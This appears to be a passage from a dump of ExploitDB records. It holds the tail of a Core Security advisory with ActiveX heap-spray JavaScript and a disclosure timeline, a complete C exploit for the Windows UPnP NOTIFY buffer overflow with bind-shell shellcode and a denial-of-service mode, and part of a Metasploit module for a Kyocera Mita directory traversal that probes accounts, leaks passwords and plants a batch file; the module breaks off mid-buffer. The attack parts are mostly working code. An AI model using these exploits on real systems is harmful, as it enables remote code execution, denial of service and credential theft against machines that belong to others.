spraySlide += spraySlide;\r\n~    }\r\n~    spraySlide = spraySlide.substring(0,spraySlideSize/2);\r\n~    return (spraySlide);\r\n~  }\r\n\r\n~  var heapBlockSize = 0x100000;\r\n~  var SizeOfHeapDataMoreover = 0x5;\r\n~  var payLoadSize = (shellcode.length * 2);\r\n\r\n~  var spraySlideSize = heapBlockSize - (payLoadSize +\r\nSizeOfHeapDataMoreover);\r\n~  var heapBlocks = (heapSprayToAddress+heapBlockSize)/heapBlockSize;\r\n\r\n~  var memory = new Array();\r\n~  spraySlide = getSpraySlide(spraySlide,spraySlideSize);\r\n\r\n~  for (i=0;i<heapBlocks;i++)\r\n~  {\r\n~    memory[i] = spraySlide +  shellcode;\r\n~  }\r\n~  document.botontrigger.Click();\r\n\r\n</script>\r\n\r\n\r\n</body>\r\n</html>\r\n\'\'\'\r\nmalicioushtml.write(jscode)\r\nmalicioushtml.close()\r\n\r\n- -----------/\r\n\r\n\r\n*Report Timeline*\r\n\r\n. 2008-06-27: Core Security Technologies notifies Anzio that there is a\r\nvulnerability in Web Print Object (WePO).\r\n. 2008-06-28: Vendor acknowledges notification.\r\n. 2008-07-01: Core sends an advisory draft, containing technical details\r\nand Proof of Concept code for the vulnerability.\r\n. 2008-07-08: Core asks for confirmation of the vulnerability, and\r\nreminds the vendor that the advisory\'s publication date is set to July\r\n14th, 2008.\r\n. 2008-07-08: Vendor asks Core to resend the report.\r\n. 2008-07-14: Core sends (again) the advisory draft, and asks for\r\ninformation about the vendor\'s plan for fixing the vulnerability.\r\n. 2008-07-21: Core asks for updated information, and notifies the vendor\r\nthat the advisory\'s publication date has been rescheduled for August 4th.\r\n. 2008-07-21: Vendor asks Core to resend the report.\r\n. 2008-07-21: Core sends (for the third time) the advisory draft as a\r\ncompressed file.\r\n. 2008-07-21: Vendor confirms reception of the reports and states that\r\nthe problem has been identified.\r\n. 2008-07-31: Core asks for updated information about the release of\r\nfixed versions (no reply received).\r\n. 2008-08-04: Core asks for updated information, and reschedules the\r\npublication of the advisory to August 11th 2008 (no reply received).\r\n. 2008-08-11: Core makes a phone call to the vendor, asking one more\r\ntime for a release date of fixed versions. Vendor informs that new\r\nversions will be released during the week.\r\n. 2008-08-15: Vendor releases fixed version Anzio Web Print Object 3.2.30.\r\n. 2008-08-20: Advisory CORE-2008-0624 is published.\r\n\r\n\r\n*About CoreLabs*\r\n\r\nCoreLabs, the research center of Core Security Technologies, is charged\r\nwith anticipating the future needs and requirements for information\r\nsecurity technologies. We conduct our research in several important\r\nareas of computer security including system vulnerabilities, cyber\r\nattack planning and simulation, source code auditing, and cryptography.\r\nOur results include problem formalization, identification of\r\nvulnerabilities, novel solutions and prototypes for new technologies.\r\nCoreLabs regularly publishes security advisories, technical papers,\r\nproject information and shared software tools for public use at:\r\nhttp://www.coresecurity.com/corelabs/.\r\n\r\n\r\n*About Core Security Technologies*\r\n\r\nCore Security Technologies develops strategic solutions that help\r\nsecurity-conscious organizations worldwide develop and maintain a\r\nproactive process for securing their networks. The company\'s flagship\r\nproduct, CORE IMPACT, is the most comprehensive product for performing\r\nenterprise security assurance testing. CORE IMPACT evaluates network,\r\nendpoint and end-user vulnerabilities and identifies what resources are\r\nexposed. It enables organizations to determine if current security\r\ninvestments are detecting and preventing attacks. Core Security\r\nTechnologies augments its leading technology solution with world-class\r\nsecurity consulting services, including penetration testing and software\r\nsecurity auditing. Based in Boston, MA and Buenos Aires, Argentina, Core\r\nSecurity Technologies can be reached at 617-399-6980 or on the Web at\r\nhttp://www.coresecurity.com.\r\n\r\n\r\n*Disclaimer*\r\n\r\nThe contents of this advisory are copyright (c) 2008 Core Security\r\nTechnologies and (c) 2008 CoreLabs, and may be distributed freely\r\nprovided that no fee is charged for this distribution and proper credit\r\nis given.\r\n\r\n\r\n*GPG/PGP Keys*\r\n\r\nThis advisory has been signed with the GPG key of Core Security\r\nTechnologies advisories team, which is available for download at\r\nhttp://www.coresecurity.com/files/attachments/core_security_advisories.asc.\r\n\r\n-----BEGIN PGP SIGNATURE-----\r\nVersion: GnuPG v1.4.8 (MingW32)\r\nComment: Using GnuPG with Mozilla - http://enigmail.mozdev.org\r\n\r\niEYEARECAAYFAkisi0kACgkQyNibggitWa06LwCePQwBxufs6dhNnpGCbV5ceQ1A\r\nXBwAn2RPeKeyz9ziw5a0BbjIQ5Sggvuy\r\n=9eOd\r\n-----END PGP SIGNATURE-----\r\n\r\n# milw0rm.com [2008-08-20]', u'description': u'Anzio Web Print Object 3.2.30 - ActiveX Buffer Overflow', u'platform': u'windows', u'author': u'Core Security', u'cve': [u'CVE-2008-3480'], u'source': u'ExploitDB', u'date': u'2008-08-20T00:00:00+00:00', u'_id': 6278, u'type': u'remote', u'port': 0}

CVE: []
Description: Microsoft Windows 98/XP/ME - UPnP NOTIFY Buffer Overflow (1)
{u'code': u'source: http://www.securityfocus.com/bid/3723/info\r\n\r\nUniversal Plug and Play, or UPnP, is a service that allows for hosts to locate and use devices on the local network. UPnP support ships with Windows XP and ME. For Windows 98 and 98SE, it is available with Windows XP\'s Internet Connection Sharing client. It should be noted that UPnP services are enabled on Windows XP by default.\r\n\r\nWhen processing the location field in a NOTIFY directive, UPnP server process memory can be overwritten by data that originated in the packet. If the IP address, port and filename components are of excessive length, access violations will occur when the server attempts to dereference pointers overwritten with data from the packet.\r\n\r\nIt should be noted that the service listens on broadcast and multicast interfaces. This could permit an attacker to exploit a number of systems without knowing their individual IP addresses, if they employed an exploitation method targeting a UDP port. It is however possible to exploit this condition using either the TCP or UDP protocols.\r\n\r\nThe UPnP service runs in the LOCAL SERVICE security context. An attacker who successfully exploits this vulnerability could gain control over the target host. \r\n\r\n/*\r\n * WinME/XP UPNP dos & overflow\r\n *\r\n * Run: ./XPloit host <option>\r\n *\r\n * Windows run the "Universal Plug and Play technology" service\r\n * at port 5000. In the future this will allow for seemless\r\n * connectivity of various devices such as a printer.\r\n * This service have a DoS and a buffer overflow I exploit here.\r\n *\r\n * PD: the -e option spawns a cmd.exe shell on port 7788 coded by isno\r\n *\r\n * Author: Gabriel Maggiotti\r\n * Email: gmaggiot@ciudad.com.ar\r\n * Webpage: http://qb0x.net\r\n */\r\n\r\n#include <stdio.h>\r\n#include <string.h>\r\n#include <stdlib.h>\r\n#include <errno.h>\r\n#include <string.h>\r\n#include <netdb.h>\r\n#include <sys/types.h>\r\n#include <netinet/in.h>\r\n#include <sys/socket.h>\r\n#include <sys/wait.h>\r\n#include <unistd.h>\r\n#include <fcntl.h>\r\n\r\n#define MAX 10000\r\n#define PORT 5000\r\n#define FREEZE 512\r\n#define NOP 0x43 //inc ebx, instead of 0x90\r\n\r\n/***************************************************************************/\r\n\r\nint main(int argc,char *argv[])\r\n{\r\nint sockfd[MAX];\r\nchar sendXP[]="XP";\r\nchar jmpcode[281], execode[840],request[2048];\r\nchar *send_buffer;\r\nint num_socks;\r\nint bindport;\r\nint i;\r\nint port;\r\n\r\n unsigned char shellcode[] =\r\n        "\\x90\\xeb\\x03\\x5d\\xeb\\x05\\xe8\\xf8\\xff\\xff\\xff\\x83\\xc5\\x15\\x90\\x90"\r\n        "\\x90\\x8b\\xc5\\x33\\xc9\\x66\\xb9\\x10\\x03\\x50\\x80\\x30\\x97\\x40\\xe2\\xfa"\r\n        "\\x7e\\x8e\\x95\\x97\\x97\\xcd\\x1c\\x4d\\x14\\x7c\\x90\\xfd\\x68\\xc4\\xf3\\x36"\r\n        "\\x97\\x97\\x97\\x97\\xc7\\xf3\\x1e\\xb2\\x97\\x97\\x97\\x97\\xa4\\x4c\\x2c\\x97"\r\n        "\\x97\\x77\\xe0\\x7f\\x4b\\x96\\x97\\x97\\x16\\x6c\\x97\\x97\\x68\\x28\\x98\\x14"\r\n        "\\x59\\x96\\x97\\x97\\x16\\x54\\x97\\x97\\x96\\x97\\xf1\\x16\\xac\\xda\\xcd\\xe2"\r\n        "\\x70\\xa4\\x57\\x1c\\xd4\\xab\\x94\\x54\\xf1\\x16\\xaf\\xc7\\xd2\\xe2\\x4e\\x14"\r\n        "\\x57\\xef\\x1c\\xa7\\x94\\x64\\x1c\\xd9\\x9b\\x94\\x5c\\x16\\xae\\xdc\\xd2\\xc5"\r\n        "\\xd9\\xe2\\x52\\x16\\xee\\x93\\xd2\\xdb\\xa4\\xa5\\xe2\\x2b\\xa4\\x68\\x1c\\xd1"\r\n        "\\xb7\\x94\\x54\\x1c\\x5c\\x94\\x9f\\x16\\xae\\xd0\\xf2\\xe3\\xc7\\xe2\\x9e\\x16"\r\n        "\\xee\\x93\\xe5\\xf8\\xf4\\xd6\\xe3\\x91\\xd0\\x14\\x57\\x93\\x7c\\x72\\x94\\x68"\r\n        "\\x94\\x6c\\x1c\\xc1\\xb3\\x94\\x6d\\xa4\\x45\\xf1\\x1c\\x80\\x1c\\x6d\\x1c\\xd1"\r\n        "\\x87\\xdf\\x94\\x6f\\xa4\\x5e\\x1c\\x58\\x94\\x5e\\x94\\x5e\\x94\\xd9\\x8b\\x94"\r\n        "\\x5c\\x1c\\xae\\x94\\x6c\\x7e\\xfe\\x96\\x97\\x97\\xc9\\x10\\x60\\x1c\\x40\\xa4"\r\n        "\\x57\\x60\\x47\\x1c\\x5f\\x65\\x38\\x1e\\xa5\\x1a\\xd5\\x9f\\xc5\\xc7\\xc4\\x68"\r\n        "\\x85\\xcd\\x1e\\xd5\\x93\\x1a\\xe5\\x82\\xc5\\xc1\\x68\\xc5\\x93\\xcd\\xa4\\x57"\r\n        "\\x3b\\x13\\x57\\xe2\\x6e\\xa4\\x5e\\x1d\\x99\\x13\\x5e\\xe3\\x9e\\xc5\\xc1\\xc4"\r\n        "\\x68\\x85\\xcd\\x3c\\x75\\x7f\\xd1\\xc5\\xc1\\x68\\xc5\\x93\\xcd\\x1c\\x4f\\xa4"\r\n  "\\x57\\x3b\\x13\\x57\\xe2\\x6e\\xa4\\x5e\\x1d\\x99\\x17\\x6e\\x95\\xe3\\x9e\\xc5"\r\n        "\\xc1\\xc4\\x68\\x85\\xcd\\x3c\\x75\\x70\\xa4\\x57\\xc7\\xd7\\xc7\\xd7\\xc7\\x68"\r\n        "\\xc0\\x7f\\x04\\xfd\\x87\\xc1\\xc4\\x68\\xc0\\x7b\\xfd\\x95\\xc4\\x68\\xc0\\x67"\r\n        "\\xa4\\x57\\xc0\\xc7\\x27\\x9b\\x3c\\xcf\\x3c\\xd7\\x3c\\xc8\\xdf\\xc7\\xc0\\xc1"\r\n        "\\x3a\\xc1\\x68\\xc0\\x57\\xdf\\xc7\\xc0\\x3a\\xc1\\x3a\\xc1\\x68\\xc0\\x57\\xdf"\r\n        "\\x27\\xd3\\x1e\\x90\\xc0\\x68\\xc0\\x53\\xa4\\x57\\x1c\\xd1\\x63\\x1e\\xd0\\xab"\r\n        "\\x1e\\xd0\\xd7\\x1c\\x91\\x1e\\xd0\\xaf\\xa4\\x57\\xf1\\x2f\\x96\\x96\\x1e\\xd0"\r\n        "\\xbb\\xc0\\xc0\\xa4\\x57\\xc7\\xc7\\xc7\\xd7\\xc7\\xdf\\xc7\\xc7\\x3a\\xc1\\xa4"\r\n        "\\x57\\xc7\\x68\\xc0\\x5f\\x68\\xe1\\x67\\x68\\xc0\\x5b\\x68\\xe1\\x6b\\x68\\xc0"\r\n        "\\x5b\\xdf\\xc7\\xc7\\xc4\\x68\\xc0\\x63\\x1c\\x4f\\xa4\\x57\\x23\\x93\\xc7\\x56"\r\n        "\\x7f\\x93\\xc7\\x68\\xc0\\x43\\x1c\\x67\\xa4\\x57\\x1c\\x5f\\x22\\x93\\xc7\\xc7"\r\n        "\\xc0\\xc6\\xc1\\x68\\xe0\\x3f\\x68\\xc0\\x47\\x14\\xa8\\x96\\xeb\\xb5\\xa4\\x57"\r\n        "\\xc7\\xc0\\x68\\xa0\\xc1\\x68\\xe0\\x3f\\x68\\xc0\\x4b\\x9c\\x57\\xe3\\xb8\\xa4"\r\n        "\\x57\\xc7\\x68\\xa0\\xc1\\xc4\\x68\\xc0\\x6f\\xfd\\xc7\\x68\\xc0\\x77\\x7c\\x5f"\r\n        "\\xa4\\x57\\xc7\\x23\\x93\\xc7\\xc1\\xc4\\x68\\xc0\\x6b\\xc0\\xa4\\x5e\\xc6\\xc7"\r\n        "\\xc1\\x68\\xe0\\x3b\\x68\\xc0\\x4f\\xfd\\xc7\\x68\\xc0\\x77\\x7c\\x3d\\xc7\\x68"\r\n        "\\xc0\\x73\\x7c\\x69\\xcf\\xc7\\x1e\\xd5\\x65\\x54\\x1c\\xd3\\xb3\\x9b\\x92\\x2f"\r\n   &nbsp;    "\\x97\\x97\\x97\\x50\\x97\\xef\\xc1\\xa3\\x85\\xa4\\x57\\x54\\x7c\\x7b\\x7f\\x75"\r\n        "\\x6a\\x68\\x68\\x7f\\x05\\x69\\x68\\x68\\xdc\\xc1\\x70\\xe0\\xb4\\x17\\x70\\xe0"\r\n        "\\xdb\\xf8\\xf6\\xf3\\xdb\\xfe\\xf5\\xe5\\xf6\\xe5\\xee\\xd6\\x97\\xdc\\xd2\\xc5"\r\n        "\\xd9\\xd2\\xdb\\xa4\\xa5\\x97\\xd4\\xe5\\xf2\\xf6\\xe3\\xf2\\xc7\\xfe\\xe7\\xf2"\r\n        "\\x97\\xd0\\xf2\\xe3\\xc4\\xe3\\xf6\\xe5\\xe3\\xe2\\xe7\\xde\\xf9\\xf1\\xf8\\xd6"\r\n  "\\x97\\xd4\\xe5\\xf2\\xf6\\xe3\\xf2\\xc7\\xe5\\xf8\\xf4\\xf2\\xe4\\xe4\\xd6\\x97"\r\n        "\\xd4\\xfb\\xf8\\xe4\\xf2\\xdf\\xf6\\xf9\\xf3\\xfb\\xf2\\x97\\xc7\\xf2\\xf2\\xfc"\r\n        "\\xd9\\xf6\\xfa\\xf2\\xf3\\xc7\\xfe\\xe7\\xf2\\x97\\xd0\\xfb\\xf8\\xf5\\xf6\\xfb"\r\n        "\\xd6\\xfb\\xfb\\xf8\\xf4\\x97\\xc0\\xe5\\xfe\\xe3\\xf2\\xd1\\xfe\\xfb\\xf2\\x97"\r\n        "\\xc5\\xf2\\xf6\\xf3\\xd1\\xfe\\xfb\\xf2\\x97\\xc4\\xfb\\xf2\\xf2\\xe7\\x97\\xd2"\r\n        "\\xef\\xfe\\xe3\\xc7\\xe5\\xf8\\xf4\\xf2\\xe4\\xe4\\x97\\x97\\xc0\\xc4\\xd8\\xd4"\r\n        "\\xdc\\xa4\\xa5\\x97\\xe4\\xf8\\xf4\\xfc\\xf2\\xe3\\x97\\xf5\\xfe\\xf9\\xf3\\x97"\r\n        "\\xfb\\xfe\\xe4\\xe3\\xf2\\xf9\\x97\\xf6\\xf4\\xf4\\xf2\\xe7\\xe3\\x97\\xe4\\xf2"\r\n        "\\xf9\\xf3\\x97\\xe5\\xf2\\xf4\\xe1\\x97\\x95\\x97\\x89\\xfb\\x97\\x97\\x97\\x97"\r\n        "\\x97\\x97\\x97\\x97\\x97\\x97\\x97\\x97\\xf4\\xfa\\xf3\\xb9\\xf2\\xef\\xf2\\x97"\r\n        "\\x68\\x68\\x68\\x68";\r\nstruct hostent *he;\r\nstruct sockaddr_in their_addr;\r\n\r\n\r\n  if(argc!=3)\r\n  {\r\n    fprintf(stderr,"usage:%s <hostname> <command>\\n",argv[0]);\r\n    fprintf(stderr,"-f freeze the machine.\\n");\r\n    fprintf(stderr,"-e exploit.\\n");\r\n    exit(1);\r\n  }\r\n\r\n\r\n  if(strstr(argv[2],"-f")) {\r\n    num_socks=FREEZE;\r\n    send_buffer=sendXP;\r\n  }\r\n\r\n  if(strstr(argv[2],"-e")) {\r\n    num_socks=1;\r\n    send_buffer=request;\r\n    bindport^=0x9797;\r\n    shellcode[778]= (bindport) & 0xff;\r\n    shellcode[779]= (bindport >> 8) & 0xff;\r\n\r\n    for(i = 0; i < 268; i++)\r\n            jmpcode[i] = (char)NOP;\r\n\r\n    jmpcode[268] = (char)0x4d;\r\n    jmpcode[269] = (char)0x3f;\r\n    jmpcode[270] = (char)0xe3;\r\n    jmpcode[271] = (char)0x77;\r\n    jmpcode[272] = (char)0x90;\r\n    jmpcode[273] = (char)0x90;\r\n    jmpcode[274] = (char)0x90;\r\n    jmpcode[275] = (char)0x90;\r\n\r\n    //jmp [ebx+0x64], jump to execute shellcode\r\n    jmpcode[276] = (char)0xff;\r\n    jmpcode[277] = (char)0x63;\r\n    jmpcode[278] = (char)0x64;\r\n    jmpcode[279] = (char)0x90;\r\n    jmpcode[280] = (char)0x00;\r\n\r\n    for(i = 0; i < 32; i++)\r\n         execode[i] = (char)NOP;\r\n    execode[32]=(char)0x00;\r\n    strcat(execode, shellcode);\r\n\r\n         snprintf(request, 2048, "%s%s\\r\\n\\r\\n", jmpcode, execode);\r\n  }\r\n\r\n  if((he=gethostbyname(argv[1]))==NULL)\r\n  {\r\n    perror("gethostbyname");\r\n    exit(1);\r\n  }\r\n\r\n\r\n/***************************************************************************/\r\n\r\n  for(i=0; i<num_socks;i++)\r\n    if( (sockfd[i]=socket(AF_INET,SOCK_STREAM,0)) == -1) {\r\n      perror("socket"); exit(1);\r\n    }\r\n\r\n\r\n  their_addr.sin_family=AF_INET;\r\n  their_addr.sin_port=htons(PORT);\r\n  their_addr.sin_addr=*((struct in_addr*)he->h_addr);\r\n  bzero(&(their_addr.sin_zero),8);\r\n\r\n\r\n\r\n  for(i=0; i<num_socks;i++)\r\n    if( connect(sockfd[i],(struct sockaddr*)&their_addr, sizeof(struct sockaddr))==-1)\r\n  {\r\n    perror("connect");\r\n    exit(1);\r\n  }\r\n\r\n\r\n  for(i=0; i<num_socks;i++)\r\n  if(send(sockfd[i],send_buffer,strlen(send_buffer),0) ==-1)\r\n  {\r\n    perror("send");\r\n    exit(0);\r\n  }\r\n\r\n\r\n  for(i=0; i<num_socks;i++)\r\n  close(sockfd[i]);\r\n\r\n\r\nreturn 0;\r\n}', u'description': u'Microsoft Windows 98/XP/ME - UPnP NOTIFY Buffer Overflow (1)', u'platform': u'windows', u'author': u'Gabriel Maggiotti', u'cve': [], u'source': u'ExploitDB', u'date': u'2001-12-20T00:00:00+00:00', u'_id': 21188, u'type': u'remote', u'port': 0}

CVE: []
Description: Kyocera Mita Scanner File Utility 3.3.0.1 - File Transfer Directory Traversal
{u'code': u'source: http://www.securityfocus.com/bid/30855/info\r\n\r\nKyocera Mita Scanner File Utility is prone to a directory-traversal vulnerability because it fails to adequately sanitize user-supplied input.\r\n\r\nAttackers can exploit this issue to create and overwrite arbitrary files on the affected computer.\r\n\r\nKyocera Mita Scanner File Utility 3.3.0.1 is vulnerable; other versions may also be affected. \r\n\r\nmodule Msf\r\n\r\nclass Auxiliary::Spoof::Kyocera::FileUtility < Msf::Auxiliary\r\n\t\r\n\t#\r\n\t# This exploit affects TCP servers, so we use the TCP client mixin.\r\n\t#\r\n\tinclude Exploit::Remote::Tcp\r\n\t\r\n\tdef initialize(info = {})\r\n\tsuper(update_info(info,\r\n\t\t\r\n\t\t\'Name\' => \'Kyocera Mita File Utility File Injection\',\r\n\t\t\'Description\' => %q{\r\n\t\t\tThis exploit attacks the Kyocera Mita File Utility 3.3.0.1 that is part of a scan to desktop\r\n\t\t\tsolution. There are several bugs in this service. First, there is no authentication. This means anyone\r\n\t\t\tcan upload a file to the target PC. Second, the file can contain anything, including binary data. Finally,\r\n\t\t\tthe file name can be altered to include directory information, thus redirecting the file from\r\n\t\t\tthe default upload location to a specified location. Combined, the service will allow a remote attacker\r\n\t\t\tto upload any file to any location on the system. If you do\r\n\t\t\tnot know the correct ID number of the client side account, you can use the included getidno command to\r\n\t\t\tscan a system to detect any and all ID numbers. This will also provide you with any associated \r\n\t\t\tpasswords required by printer to upload documents.\r\n\t\t},\r\n\r\n\t\t\'Author\'         => \'Seth Fogie <seth@whitewolfsecurity.com>\'\r\n\r\n\t\t)\r\n\t)\r\n\tregister_options(\r\n          [\r\n              \tOptString.new(\'RPORT\', [ true,  "Target port - default is 37100", \'37100\' ]),\r\n              \tOptString.new(\'RHOST\', [ true,  "Target host", \'1\']),\r\n\t\t \tOptString.new(\'CMD\', [ true,  "Command", \'calc.exe\']),\r\n\t\t\tOptInt.new(\'IDNO\', [ true,  "ID number (1-100)", \'1\']),\r\n\t\t\tOptString.new(\'IDENT\', [ true,  "Identification name", \'ANON\']),\r\n\t\t\tOptString.new(\'FILENAME\', [ true,  "File name (with folder)", \'Kyocera.bat\']),\r\n\t\t\tOptString.new(\'FOLDER\', [ false,  "Folder (relative to scan folder)", \'\']),\r\n\r\n          ], self.class\r\n          )\r\nend\r\n\r\n\t\r\n\tdef auxiliary_commands\r\n\t\treturn { \r\n\t\t\t"getidno" => "Determine a correct idno",\r\n\t\t }\r\n\tend\r\n\r\n\t#this command detects any and all valid accounts on target machine and returns associated passwords.\r\n\tdef cmd_getidno()\r\n\t\t\t\t\r\n\t\t1.upto(100) do |i|\r\n   \t\t\r\n\t\t\tconnect\r\n\t\r\n\t\t\tprint(".")\r\n\t\t\t\r\n\t\t\t# Build the buffer for transmission\r\n\t\t\tbuf= "\\x00\\x06\\x34\\x00\\x00\\x02\\x00\\x00" #control message to PC\r\n\t\r\n\t\t\t# Send it off and get response\r\n\t\t\tsock.put(buf)\r\n\t\t\tsock.get\r\n\t\r\n\t\t\t#add ID number\r\n\t\t\tidno  = i\r\n\t\r\n\t\t\tbuf = "\\x02\\x1c\\x34\\x02" +\t\t\t#details about file name for file utility function\r\n\t\t\t[idno].pack(\'n\') +\t\t\t\t#ID number\r\n\t\t\t"\\x00\\x08" +\r\n\t\t\t"\\x00\\x0d" +\r\n\t\t\t"\\x41\\x41\\x41\\x41\\x00\\x4e\\x53\\x4e\\x5f\\x53\\x4b\\x41\\x4e\\x3a" +\r\n\t\t\t"\\x41\\x41\\x41\\x41\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" +\r\n\t\t\t"\\x00\\x00\\x00\\x00\\x00\\x00"\r\n\t\r\n\t\t\tsock.put(buf)\r\n\t\t\tnulls="\\x00\\x00"\r\n\t\t\tpassTest="\\xFF\\xFF"\r\n\t\t\tdata=sock.get\r\n\t\t\tdataStr=data.to_s\r\n\r\n\t\t\tif dataStr[dataStr.length-6,2] == nulls\r\n\t\t\t\tprint("\\n")\r\n\t\t\t\tprint_status("Valid account number found: " + i.to_s)\t\r\n\t\t\tend\r\n\t\t\tif dataStr[dataStr.length-2,2] != passTest\r\n\t\t\t\tprint_status("BONUS! Password! (last four or eight characters of string)" )\r\n\t\t\t\tj=0\r\n\t\t\t\twhile j<12\r\n       \t\t\t\tprintf("%X",data[j])\r\n     \t\t\t\t\tj+=1\r\n\t\t\t       end\r\n\t\t\t\tprint("\\n")\r\n\t\t\tend\r\n\r\n\t\t\t\r\n\t\r\n\t\t\tsock.close\r\n\t\tend\r\n\t\tprint("\\n")\r\n\t\t\t\t\r\n\tend\r\n\t\r\n\r\n#\r\n# The exploit sends the specified command into a kyocera.bat file in the specified folder\r\n#\r\ndef run\r\n\r\n\tbegin\r\n\tconnect\r\n\t\r\n\tprint_status("Sending command...")\r\n\t\r\n\t# Build the buffer for transmission\r\n\tbuf= "\\x00\\x06\\x34\\x00\\x00\\x02\\x00\\x00" #control message to PC\r\n\t\r\n\t# Send it off and get response\r\n\tsock.put(buf)\r\n\tsock.get\r\n\t\r\n\t#add ID number\r\n\tidno  = datastore[\'IDNO\']\r\n\tident = datastore[\'IDENT\']\r\n\tfilename = datastore[\'FILENAME\']\r\n\tfolder = datastore[\'FOLDER\']\r\n\tlocationLength = filename.length + folder.length\r\n\r\n\t\r\n\tbuf = "\\x02\\x1c\\x34\\x02" +\t\t\t#details about file name for file utility function\r\n\t[idno].pack(\'n\') +\t\t\t\t#ID number\r\n\t"\\x00\\x08" +\r\n\t"\\x00\\x0d" +\r\n\t"\\x41\\x41\\x41\\x41" +\r\n\t"\\x00\\x4e\\x53\\x4e\\x5f\\x53\\x4b\\x41\\x4e\\x3a" +\r\n\tident +\r\n\t"\\x00\\x00\\x00\\x00" +\r\n\t"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00" 